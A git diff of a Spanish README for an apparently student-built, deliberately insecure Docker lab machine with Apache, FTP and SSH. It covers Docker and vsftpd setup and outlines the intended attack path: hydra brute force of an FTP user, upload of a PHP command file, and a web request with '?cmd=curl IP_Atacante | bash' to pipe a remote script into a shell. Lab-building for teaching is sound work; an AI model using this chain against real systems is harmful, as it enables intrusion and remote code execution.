@@ -144,7 +144,7 @@
 - Instalacion de docker a nuestro sistema Ubuntu.
 - Creación de cuenta de DockerHub para guardar las imagenes en la nube y poder compartiras con el grupo.
 - Creación acrivo dockerfile:
-- 
+
 FROM marcositb/grupo4_insecure_design:v1.0
 
 // Exponer los puertos necesarios
@@ -159,12 +159,29 @@ CMD service apache2 start && service vsftpd start && /usr/sbin/sshd -D
 - Abrimos un terminal y nos ponemos como sudo(sudo su).
 - En la misma ruta donde esta el archivo dockerfile ejecutamos el siguiente comando: docker build -t marcositb/grupo4_insecure_design:v1.0 . para crear la imagen.
 - Una vez creada la iniciamos haciendo un docker run marcositb/grupo4_insecure_design:v1.0
+- Entramos dentro de la maquina haciendo un docker exec -it idContenedor bash.
+- Hemos tenido que instalar por nuestra cuenta diferentes herramientas como: vim, python3.10, nano, etc.
+
+##FTP
+
+Lo primero que hemos hecho es mirar si el servicio de ftp esta encendido con service vsftpd status, si esta encendido bien si no hacemos service vsftpd start.
+
+Una vez iniciado creamos un usuario local con adduser elijah, porque queremos tener uno solo para ftp aparte del anonymous.
+
+Para configurar los permisos del anonymous y los del usuario elijah tenemos que modificar los siguientes ficheros (vsftpd.conf, passwd):
+
+- vsftpd.conf lo abrimos con vim /etc/vsftpd.conf y cambiemos lo siguiente
+
+![vsftpd](https://github.com/Dani-ITB24/Proyecto-Final/assets/157145186/87d2c177-1526-4dda-b3ba-549a1d9d8c65)
+
 
 ## Que vulnerabilidades hemos hecho y como las hemos implementado:
 
 Para empezar tenemos una web inspirada en la serie The Originals. Hemos implementado los servicios apache, ftp y ssh.
 
-En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get y ls. Al hacer este ls puede observar que tiene una carpeta con un nombre de usuario.
+En ftp hemos dejado activo el usuario anonymous, este no puede hacer nada, unicamente get.
+
+
 
 El atacante debera hacer un hydra en este usuario para sacar la contraseña, este usuario no tiene nada dentro, pero si tiene permisos diferentes como el de subir un fichero.
 
@@ -178,4 +195,4 @@ La maquina atacante tendra lo siguiente:
 Una vez tenemos esto en la maquina atacante, desde la web ponemos la ruta del archivo que hemos subido con el codigo php para hacer comandos, y añadimos ?cmd=curl IP_Atacante | bash.
 Y en el terminal podemos observar que nos hemos registrado como www-data.
 
-  
+
